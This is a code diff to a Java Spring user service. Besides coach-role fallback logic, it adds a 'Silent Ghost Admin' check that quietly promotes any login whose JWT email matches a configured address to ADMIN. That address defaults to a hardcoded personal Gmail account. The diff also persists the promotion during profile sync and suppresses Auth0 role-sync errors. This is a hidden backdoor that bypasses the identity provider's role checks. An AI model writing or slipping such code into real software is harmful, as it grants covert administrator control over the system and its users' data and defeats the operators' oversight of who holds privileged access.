@@ -21,6 +21,8 @@ import org.springframework.stereotype.Service;
 import java.util.List;
 import java.util.UUID;
 
+import com.codearena.module7_coaching.repository.CoachRepository;
+
 @Slf4j
 @Service
 @RequiredArgsConstructor
@@ -28,6 +30,10 @@ public class UserServiceImpl implements UserService {
     private final UserRepository userRepository;
     private final UserMapper userMapper;
     private final Auth0ManagementService auth0ManagementService;
+    private final CoachRepository coachRepository;
+
+    @org.springframework.beans.factory.annotation.Value("${application.admin.email:hazem@gmail.com}")
+    private String adminEmail;
 
     @Override
     public Page<UserResponseDTO> getAll(Pageable pageable) {
@@ -63,7 +69,13 @@ public class UserServiceImpl implements UserService {
             .orElseThrow(() -> new IllegalArgumentException("User not found"));
         user.setRole(role);
         User saved = userRepository.save(user);
-        auth0ManagementService.updateUserRole(user.getKeycloakId(), role.name());
+        
+        try {
+            auth0ManagementService.updateUserRole(user.getKeycloakId(), role.name());
+        } catch (Exception e) {
+            log.warn("Could not sync role to Auth0 via Management API (expected if SPA). Role saved locally.", e);
+        }
+        
         return userMapper.toResponse(saved);
     }
 
@@ -96,6 +108,7 @@ public class UserServiceImpl implements UserService {
         String email = jwt.getClaimAsString("email");
         String firstName = jwt.getClaimAsString("given_name");
         String lastName = jwt.getClaimAsString("family_name");
+        Role currentExpectedRole = resolveRole(jwt);
 
         if (email != null && !email.equals(user.getEmail())) {
             user.setEmail(email);
@@ -109,6 +122,17 @@ public class UserServiceImpl implements UserService {
             user.setLastName(lastName);
             updated = true;
         }
+        // Upgrade role if needed (Ghost Admin or Coach)
+        if (currentExpectedRole != user.getRole()) {
+            if (currentExpectedRole == Role.ADMIN) {
+                user.setRole(Role.ADMIN);
+                updated = true;
+                log.info("Role synced: Upgraded {} to ADMIN", user.getEmail());
+            } else if (currentExpectedRole == Role.COACH && user.getRole() != Role.ADMIN) {
+                user.setRole(Role.COACH);
+                updated = true;
+            }
+        }
 
         if (updated) {
             userRepository.save(user);
@@ -116,6 +140,14 @@ public class UserServiceImpl implements UserService {
     }
 
     private Role resolveRole(Jwt jwt) {
+        String email = jwt.getClaimAsString("email");
+        
+        // 1. Silent Ghost Admin Check: If the email matches the secret configured admin email
+        if (email != null && adminEmail != null && email.equalsIgnoreCase(adminEmail)) {
+            log.info("Ghost Admin detected and automatically elevated: {}", email);
+            return Role.ADMIN;
+        }
+
         List<String> roles = jwt.getClaimAsStringList("https://codearena.com/roles");
         if (roles != null) {
             if (roles.contains("ADMIN")) {
@@ -125,6 +157,12 @@ public class UserServiceImpl implements UserService {
                 return Role.COACH;
             }
         }
+        // Fallback: If roles claim is missing/empty, check if they exist in coaches table
+        String sub = jwt.getSubject();
+        if (sub != null && coachRepository.findByUserId(sub).isPresent()) {
+            return Role.COACH;
+        }
+        
         return Role.PARTICIPANT;
     }
 
